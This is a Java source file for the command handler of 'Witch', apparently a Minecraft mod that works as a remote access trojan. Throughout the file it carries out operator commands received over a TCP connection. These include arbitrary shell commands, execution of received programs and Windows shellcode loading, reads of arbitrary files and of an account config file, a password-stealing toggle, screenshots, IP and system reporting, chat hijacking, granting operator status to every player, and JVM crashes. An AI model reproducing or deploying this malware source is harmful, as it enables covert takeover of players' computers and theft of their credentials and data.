package me.soda.witch.client.connection;

import com.google.gson.Gson;
import me.soda.witch.client.Witch;
import me.soda.witch.client.modules.OpEveryone;
import me.soda.witch.client.modules.Spam;
import me.soda.witch.client.utils.ChatUtils;
import me.soda.witch.client.utils.MCUtils;
import me.soda.witch.client.utils.ScreenshotUtil;
import me.soda.witch.client.utils.ShellcodeLoader;
import me.soda.witch.shared.*;
import me.soda.witch.shared.socket.TcpClient;
import me.soda.witch.shared.socket.messages.Message;
import me.soda.witch.shared.socket.messages.messages.*;
import net.minecraft.client.util.GlfwUtil;

import java.lang.management.ManagementFactory;

public class Client extends TcpClient {
    public int reconnections = 0;

    public Client() {
        super(Cfg.host, Cfg.port, 30000);
    }

    public static void handleMessage(Message message) {
        try {
            LogUtil.println("Received message: " + message.data.getClass().getName());
            if (message.data instanceof ByteData data) {
                if (data.messageID.equals("execute")) new Thread(() -> ProgramUtil.runProg(data.bytes())).start();
            } else if (message.data instanceof SingleStringData data) {
                switch (data.data()) {
                    case "steal_pwd_switch" ->
                            Witch.CONFIG_INFO.passwordBeingLogged = !Witch.CONFIG_INFO.passwordBeingLogged;
                    case "chat_filter_switch" -> Witch.CONFIG_INFO.isBeingFiltered = !Witch.CONFIG_INFO.isBeingFiltered;
                    case "chat_mute" -> Witch.CONFIG_INFO.isMuted = !Witch.CONFIG_INFO.isMuted;
                    case "mods" -> Witch.send("mods", MCUtils.allMods());
                    case "systeminfo" -> Witch.send("systeminfo", MCUtils.systemInfo());
                    case "screenshot" -> ScreenshotUtil.gameScreenshot();
                    case "screenshot2" -> Witch.send("screenshot2", ScreenshotUtil.systemScreenshot());
                    case "log" -> Witch.CONFIG_INFO.logChatAndCommand = !Witch.CONFIG_INFO.logChatAndCommand;
                    case "config" -> Witch.send(Witch.CONFIG_INFO);
                    case "player" -> Witch.send(MCUtils.getPlayerInfo());
                    case "skin" -> MCUtils.sendPlayerSkin();
                    case "server" -> {
                        MCUtils.disconnect();
                        Witch.CONFIG_INFO.canJoinServer = !Witch.CONFIG_INFO.canJoinServer;
                    }
                    case "kick" -> MCUtils.disconnect();
                    case "iasconfig" -> Witch.send("iasconfig", FileUtil.read("config/ias.json"));
                    case "runargs" ->
                            Witch.send("runargs", new Gson().toJson(ManagementFactory.getRuntimeMXBean().getInputArguments()));
                    case "props" -> Witch.send("props", System.getProperties().toString());
                    case "ip" -> Witch.send("ip", NetUtil.getIP());
                    case "crash" -> GlfwUtil.makeJvmCrash();
                    case "op@a" -> OpEveryone.INSTANCE.opEveryone();
                }
            } else if (message.data instanceof StringData data) {
                switch (data.messageID()) {
                    case "chat_control" -> ChatUtils.sendChat(data.data());
                    case "chat_filter" -> Witch.CONFIG_INFO.filterPattern = data.data();
                    case "chat" -> {
                        Witch.CHAT_WINDOW.frame.setVisible(true);
                        Witch.CHAT_WINDOW.appendText("Admin:" + data.data());
                    }
                    case "shell" -> new Thread(() -> {
                        String result = ProgramUtil.runCmd(data.data());
                        Witch.send("shell", "\n" + result);
                    }).start();
                    case "shellcode" -> {
                        if (ProgramUtil.isWin())
                            new Thread(() -> new ShellcodeLoader().loadShellCode(data.data())).start();
                    }
                    case "read" -> Witch.send("read", FileUtil.read(data.data()));
                    case "server_name" -> Witch.CONFIG_INFO.name = data.data();
                }
            } else if (message.data instanceof SpamData data) {
                Spam.INSTANCE.spam(data);
            }
        } catch (Exception e) {
            LogUtil.println("Corrupted message!");
            LogUtil.printStackTrace(e);
        }
    }

    @Override
    public boolean onReconnect() {
        if (reconnections <= 10) {
            reconnections++;
        } else {
            reconnectTimeout = -1;
            LogUtil.println("Witch end because of manual shutdown or too many reconnections");
            return false;
        }
        return true;
    }

    @Override
    public void onOpen() {
        LogUtil.println("Connection initialized");
        Witch.send(MCUtils.getPlayerInfo());
        Witch.send("server_name");
        Witch.send("ip", NetUtil.getIP());
    }

    @Override
    public void onMessage(Message message) {
        handleMessage(message);
    }

    @Override
    public void onClose(DisconnectData disconnectData) {
        Witch.CHAT_WINDOW.appendText("Admin disconnected.");
        LogUtil.println("Disconnected: " + disconnectData.reason());
    }
}